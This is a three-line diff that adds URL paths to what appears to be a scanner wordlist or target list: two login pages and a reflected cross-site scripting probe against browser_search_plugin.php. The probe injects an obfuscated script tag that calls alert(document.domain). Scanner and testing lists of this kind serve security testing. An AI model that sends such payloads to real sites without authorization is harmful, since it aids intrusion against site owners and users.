@@ -1,0 +1,3 @@
+/_dashboards/app/login
+/app/login?
+/browser_search_plugin.php?type=text%27%22()%26%25<acx><ScRiPt>alert(document.domain)</ScRiPt>
